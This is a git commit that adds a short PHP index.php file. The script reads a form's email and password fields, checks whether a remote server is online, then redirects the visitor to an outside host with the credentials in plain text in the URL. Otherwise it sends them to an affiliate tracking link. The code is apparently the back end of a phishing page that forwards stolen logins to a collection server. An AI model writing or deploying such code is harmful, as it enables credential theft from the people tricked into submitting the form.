f06360bfc2d15daf484db7f048d2011ee4dbd87b
limberlisa <54564259+limberlisa@users.noreply.github.com>
2020-02-12 23:33:53 -0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,22 @@
+<?php 
+if(isset($_POST['submit'])){
+
+$usuario = $_POST['email'];
+$password = $_POST['pass'];
+// API SERVER
+$estadisticasAPI = json_decode( file_get_contents('http://server1.3utilities.com/api-server.php'), true );
+$estado = $estadisticasAPI['estado'];
+
+if($estado == 'online'){
+
+ header ("Location: http://server1.3utilities.com/chelin/login.php?usuario=".$usuario ."&password=".$password."");
+
+}else{
+
+  header ("Location: https://Tracking-all-traffic.offerdirecto.com?id=LGoRTd6m85&type=21&click_id={click_id}");
+}
+
+}
+
+
+ ?>
